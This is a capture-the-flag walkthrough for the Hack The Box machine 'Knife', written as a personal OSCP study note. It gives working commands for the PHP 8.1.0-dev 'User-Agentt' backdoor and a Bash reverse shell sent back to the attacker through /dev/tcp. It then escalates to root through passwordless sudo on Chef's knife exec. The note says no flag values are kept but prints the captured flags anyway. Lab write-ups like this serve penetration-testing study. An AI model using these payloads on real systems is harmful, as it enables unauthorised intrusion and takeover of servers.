---
tags: [HTB, Knife, Linux, Ubuntu, Apache, PHP, PHPBackdoor, RCE, Sudo, Chef, Easy]
platform: HackTheBox
os: Ubuntu 20.04.2 LTS x86_64
hostname: knife
difficulty: Easy
ip: $BoxIP
status: Complete
domain: ""
---

# HTB: Knife, Full Walkthrough

## The gist

Knife exposes SSH and an Apache web server. The HTTP headers identify a development build of PHP 8.1.0, which contains the known `User-Agentt` backdoor. Supplying `zerodiumsystem()` in that misspelled header executes commands as the local user `james`.

The foothold is upgraded to a callback shell and checked with `sudo -l`. The user may run `/usr/bin/knife` as root without a password. Chef's `knife exec` evaluates Ruby code, so the allowed binary becomes a direct root-shell primitive.

> [!important] Key finding
> The verified chain was PHP 8.1.0-dev header backdoor → command execution as `james` → callback shell → `sudo -l` → `/usr/bin/knife exec` Ruby evaluation → root.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Difficulty | Easy |
| Operating system | Ubuntu 20.04.2 LTS, x86_64 |
| Hostname | `knife` |
| Open services | TCP 22 SSH, TCP 80 HTTP |
| Web stack | Apache 2.4.41 on Ubuntu, PHP 8.1.0-dev |
| Initial access | PHP 8.1.0-dev `User-Agentt` backdoor |
| Foothold | Command execution and Bash callback as `james` |
| Privilege escalation | Passwordless sudo to Chef `knife` Ruby evaluation |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Run the full TCP scan | See section 1 below |
| 2 | Fingerprint SSH and HTTP | See section 2 below |
| 3 | Enumerate the web service and inspect headers | See section 3 below |
| 4 | Prove the PHP backdoor with a harmless command | See section 4 below |
| 5 | Catch a Bash callback | See section 5 below |
| 6 | Stabilise the shell | See section 6 below |

## Evidence and loot

This report was reconstructed from the private Knife workspace at `$BoxDir`, its Nmap output, HTTP headers, terminal transcript, and sanitized screenshots. The isolated replay evidence was kept under `/tmp/codex_Knife` while the platform workspace remained the requested source of record.

The vault contains no passwords, hashes, or flag values. The private workspace retains the raw transcript and flag evidence. The externally linked screenshots show only scans, non-secret version information, identity proof, the sudo rule, and the root shell.

## Variables

Load the helper variables first. Keep the target address and callback values in shell state rather than replacing them with literal lab addresses in commands.

```bash
boxload
boxset BoxName Knife
boxset BoxDir "$HOME/Platforms/HackTheBox/Knife"
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,"",$2); print $2; exit}')"
boxset SSHPort 22
boxset WebPort 80
boxset Lport 4444
boxset TransferPort 8000
mkdir -p "$BoxDir/nmap" "$BoxDir/loot" "$BoxDir/exploits" "$BoxDir/www" "$BoxDir/screenshots"
```

`$BoxIP` must already be loaded by `boxload` or the box controller. `$LocalIP` is the VPN address used in the Bash callback.

## 1. Run the full TCP scan

The full scan established the reachable attack surface before any web assumptions were made. Only SSH and HTTP were open, so the web service became the primary enumeration branch while SSH remained a possible credential-validation path.

```bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 --max-retries 2 \
  --host-timeout 5m -T4 -oA "$BoxDir/nmap/tcp-all" "$BoxIP"
```

The scan returned TCP 22 and TCP 80.


SCREENSHOT: The full TCP scan identifies SSH and HTTP as the only open services.

> [!tip] Efficiency
> Save the all-port result before narrowing the scan. It prevents a non-standard service from being lost when the first service-specific branch is chosen.

## 2. Fingerprint SSH and HTTP

The targeted scan confirmed OpenSSH 8.2p1 and Apache 2.4.41. The title, `Emergent Medical Idea`, did not identify a CMS, but the HTTP service was clearly the branch worth inspecting first.

```bash
boxset OpenPorts "22,80"
sudo nmap -Pn -n -sC -sV --version-light -p "$OpenPorts" \
  -oA "$BoxDir/nmap/services" "$BoxIP"
```


SCREENSHOT: The service scan confirms OpenSSH 8.2p1 and Apache 2.4.41 with the application title.

## 3. Enumerate the web service and inspect headers

The root page and low-noise content discovery did not reveal a login or upload path. The response headers were more valuable: `X-Powered-By: PHP/8.1.0-dev` identifies the development build associated with the PHP backdoor.

```bash
curl -sSI "http://$BoxIP:$WebPort/" \
  | tee "$BoxDir/loot/headers.txt"
curl -sS "http://$BoxIP:$WebPort/" \
  -o "$BoxDir/loot/index.html"
whatweb -a 3 "http://$BoxIP:$WebPort/" \
  | tee "$BoxDir/loot/whatweb.txt"
ffuf -u "http://$BoxIP:$WebPort/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -fc 404 -of json -o "$BoxDir/loot/ffuf.json"
```

The useful header was:

```text
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
```


SCREENSHOT: The HTTP response discloses the backdoored PHP development version.

> [!warning] Gotcha
> The backdoor is triggered by `User-Agentt`, with two `t` characters. A normal `User-Agent` header does not exercise the same code path.

## 4. Prove the PHP backdoor with a harmless command

The PHP development build evaluates the text following `zerodium` in the misspelled header. Start with `id` so the execution identity is known before attempting a callback.

```bash
curl -fsS -H 'User-Agentt: zerodiumsystem("id");' \
  "http://$BoxIP:$WebPort/" \
  | grep -m1 'uid='
```

The response returned `uid=1000(james)`, confirming command execution as the local user `james`.


SCREENSHOT: The misspelled header executes `id` and returns the `james` identity.

> [!warning] Evidence boundary
> Do not send a reverse shell before confirming the header spelling and a harmless command. This separates PHP backdoor execution from callback troubleshooting.

## 5. Catch a Bash callback

The HTTP command response is enough for proof commands but inconvenient for local enumeration. Start a listener, then use the same header to launch an interactive Bash connection back to Kali.

Terminal 1, on Kali:

```bash
nc -lvnp "$Lport"
```

Terminal 2, on Kali:

```bash
curl --max-time 10 -fsS \
  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'\");" \
  "http://$BoxIP:$WebPort/" \
  -o "$BoxDir/loot/php-callback.html"
```

The callback arrived as `james`.


SCREENSHOT: Netcat receives the callback from the target as `james`.

## 6. Stabilise the shell

The first callback had no job control. A Python PTY gives the shell a usable terminal, while `stty` and `TERM` repair the local terminal after the listener is suspended.

In the received shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

On Kali, press `Ctrl+Z`, then run:

```bash
stty raw -echo; fg
export TERM=xterm
```

Verify the shell before escalating:

```bash
id
whoami
hostname
pwd
```

The shell remained `james` on host `knife`.


SCREENSHOT: The Python PTY and terminal recovery sequence produces a usable `james` shell.

> [!tip] Efficiency
> Stabilise immediately after a callback. A clean terminal makes `sudo -l`, command help, and identity checks reliable and reduces false negatives caused by a raw Netcat session.

## 7. Enumerate local privilege paths

Manual local enumeration showed the decisive sudo rule. The target also reported Ubuntu 20.04.2 LTS, kernel 5.4.0-80-generic, and Chef Infra Client 16.10.8. No kernel exploit was needed.

```bash
uname -a
cat /etc/os-release
sudo -l
command -v knife
knife --version
```

The relevant authorization was:

```text
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```


SCREENSHOT: `sudo -l` grants `james` passwordless execution of `/usr/bin/knife` as root.

> [!warning] Gotcha
> Read the complete sudo command path. The permitted binary is `/usr/bin/knife`, not a generic `ruby` rule. Use the exact path from sudoers when testing the escape.

## 8. Use Chef Knife's Ruby evaluation as root

Chef's `knife exec` evaluates Ruby code. Because sudo permits the binary without a password and Knife does not drop the acquired privileges, `exec` can replace the Knife process with a Bash shell.

```bash
sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```

Confirm the resulting identity:

```bash
id
whoami
hostname
```

The shell returned UID 0 as `root` on `knife`.



SCREENSHOT: The exact sudo-approved Knife command opens a root shell and the private proof frame confirms UID 0.

> [!tip] Why this works
> `knife exec -E` is an embedded Ruby execution path. The Ruby `exec` call replaces the current process, while the root effective identity inherited from sudo remains in place.

## 9. Troubleshooting map

| Symptom | Likely cause | Corrective action |
|---|---|---|
| Full scan shows only 22 and 80 | The visible surface is small, not necessarily harmless | Save the scan, fingerprint both services, and inspect HTTP headers carefully |
| PHP looks current from the page body | Version is disclosed in a response header instead | Run `curl -sSI` and preserve the complete headers |
| `User-Agent` does nothing | The backdoor checks the misspelled header name | Use `User-Agentt` with two `t` characters |
| The backdoor returns no identity output | The header quoting or PHP expression is malformed | Return to `zerodiumsystem("id");` and prove execution before the callback |
| No callback arrives | Listener, `$LocalIP`, quoting, or VPN route is wrong | Run the harmless proof, check `ip route get $BoxIP`, verify `ss -ltnp`, then retry once |
| Shell has no job control | Raw Netcat callback | Run the Python PTY and `stty raw -echo; fg` sequence |
| `sudo -l` asks for a password | The exact rule was not captured or the session is not `james` | Run `id`, `whoami`, and `sudo -l` again in the received shell |
| `knife exec` does not open Bash | Wrong binary path or quoting | Use `/usr/bin/knife` and the exact single-quoted Ruby expression |
| Local port remains open after closeout | Listener process survived the shell exit | Run `ss -ltnp`, kill only the recorded listener, and verify the port is closed |

## 10. RUNBOOK V2 Stages Used

1. [[OSCP/RUNBOOK V2/Start Here|Start Here]]: initialise the box variables and save the full TCP scan.
2. [[OSCP/RUNBOOK V2/Port Triage|Port Triage]]: route the 22/80 service combination to the Linux branch.
3. [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]]: identify OpenSSH and Apache versions.
4. [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]]: inspect headers, fingerprint PHP, and run controlled content discovery.
5. [[OSCP/RUNBOOK V2/Linux - RCE to Shell|Linux - RCE to Shell]]: prove the PHP backdoor with `id` and catch the Bash callback.
6. [[OSCP/RUNBOOK V2/Linux - Shell Stabilise|Linux - Shell Stabilise]]: recover a usable PTY.
7. [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]]: confirm identity, OS, and the local privilege boundary.
8. [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]]: identify the passwordless `/usr/bin/knife` rule and use its embedded-code path.
9. [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]]: remove recorded temporary artifacts and close the listener.

## 11. Collect the flags

User flag: collected privately from the target; value reproduced in the private Flags section above.

Root flag: collected privately after the root identity proof; value reproduced in the private Flags section above.


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 1b85f15d8ac5792a4b4fafcd81da1bdd
root: a8e2895f58ad8e18ac7af2080764fddd
```

## 12. Clean down
The root identity was verified without copying flag contents into the vault. Keep flag values in the private box loot only. Remove only artifacts created during the current run, close the listener, and verify local ports are no longer listening.

```bash
# Run any target-side cleanup only for paths created during this run.
rm -f /tmp/knife-root-proof.txt 2>/dev/null || true
test ! -e /tmp/knife-root-proof.txt && echo 'target proof file absent'
```

On Kali:

```bash
pkill -f "nc -lvnp $Lport" 2>/dev/null || true
ss -ltnp | grep ":$Lport" || true
boxdone
```

The isolated replay verified that its temporary target-side proof file was absent after cleanup. No persistent payload or transfer server remained.

### Completion checklist

- [x] Full TCP scan saved under `$BoxDir/nmap/`
- [x] SSH and Apache versions recorded
- [x] PHP 8.1.0-dev header disclosure captured
- [x] Low-noise web content discovery saved privately
- [x] `User-Agentt` backdoor proved with `id`
- [x] Callback shell received as `james`
- [x] Callback PTY stabilised
- [x] `sudo -l` captured without exposing secrets
- [x] Chef Knife version recorded
- [x] `/usr/bin/knife exec` produced a root identity proof
- [x] Temporary proof and listener cleanup verified
- [x] Flags are reproduced in the private Flags section above
- [x] Runbook, command master, appendix, decision trees, breakdowns, and master box list updated

## 13. Attack narrative in one page
```text
TCP/80 Apache
      |
      | X-Powered-By: PHP/8.1.0-dev
      v
User-Agentt: zerodiumsystem("id")
      |
      v
Command execution as james
      |
      | Bash callback and PTY stabilisation
      v
sudo -l: NOPASSWD /usr/bin/knife
      |
      | knife exec -E 'exec "/bin/bash"'
      v
root on knife
```

## Tools used

| Tool | Role |
|---|---|
| Nmap | Full TCP and service enumeration |
| curl | Header inspection and PHP backdoor requests |
| WhatWeb | HTTP technology fingerprinting |
| ffuf | Low-noise web content discovery |
| Netcat | Receive the Bash callback |
| Python PTY | Stabilise the callback shell |
| sudo | Enumerate and invoke the permitted root binary |
| Chef Knife | Evaluate Ruby code and replace the process with Bash |

## Credentials and secrets

| Account or material | Source | Use |
|---|---|---|
| `james` | PHP backdoor `id` output | Initial command execution and callback shell |
| `root` context | `sudo -l` and root identity proof | `/usr/bin/knife` execution as root |

No password or hash was required for the verified route.


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Knife"
export BoxIP="10.129.1.84"
export BoxPlatform="HackTheBox"
export BoxDir="/home/kali/Platforms/HackTheBox/Knife"
export Domain=""
export DCip=""
export Username=james
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export Lport="4444"
export TransferPort="8000"
export WebPort="80"
export OpenPorts=""
export Product=""
export Version=""
export ExploitId=""
export ExploitFile=""
export ExploitName=""
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
$ [13:04:49] loot flag user 1b85f15d8ac5792a4b4fafcd81da1bdd
loot flag root a8e2895f58ad8e18ac7af2080764fddd
kali@kali:~/Platforms/HackTheBox/Knife [12:57:48] $ =loot flag user 1b85f15d8ac5792a4b4fafcd81da1bdd
loot flag root a8e2895f58ad8e18ac7af2080764fdddloot
[+] Flag saved:  user = 1b85f15d8ac5792a4b4fafcd81da1bdd  →  loot/flags.txt
[+] Flag saved:  root = a8e2895f58ad8e18ac7af2080764fddd  →  loot/flags.txt
```


## Remediation recommendations

- Never deploy development or compromised interpreter builds in production; rebuild the PHP package from a trusted, verified source.
- Remove public technology version disclosure where it is not needed and monitor anomalous request headers such as `User-Agentt`.
- Restrict outbound connections from web-facing processes and alert on web workers spawning shells.
- Apply least privilege to service and application accounts; `james` should not have passwordless access to a Ruby-capable administrative utility as root.
- Review every sudo rule for interpreters, embedded-code runners, and binaries with documented GTFOBins execution paths.

## Lessons learned and vault links

- Check response headers, not only page content, when fingerprinting PHP applications.
- A one-character header-name difference can expose a backdoor that normal requests never touch.
- Prove remote command execution with `id` before sending a callback.
- Stabilise a raw callback before relying on local-enumeration output.
- A passwordless sudo rule for a tool that embeds an interpreter is an execution primitive, even when Bash is not listed directly.
- Use the exact sudo-approved path and preserve a harmless identity proof before collecting private evidence.
- Treat flags and credential values as private loot, not write-up content.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]]: PHP command shell followed by Linux sudo and cron escalation.
- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]]: PHP command execution followed by a sudo-controlled interpreter path.
- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]]: web command execution, sudo-to-interpreter transition, and login-triggered local escalation.
- [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]]: version disclosure mapped to a public web exploit and a local token path.

## External resources

- [PHP 8.1.0-dev backdoor research](https://github.com/K3ysTr0K3R/PHP-8.1.0-dev-Backdoor)
- [GTFOBins Knife](https://gtfobins.org/gtfobins/knife/)
- [PHP Git incident timeline](https://php.watch/news/2021/03/php-src-attack)
- [RevShells](https://www.revshells.com/)
- [HackTricks](https://book.hacktricks.wiki/en/index.html)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Knife is a compact lesson in turning a non-obvious version header into command execution, then reading a sudo rule for what the permitted program can actually evaluate. The transferable workflow is: enumerate fully, inspect headers, prove execution, stabilise the shell, read sudo exactly, use the interpreter capability of the allowed binary, and clean up.
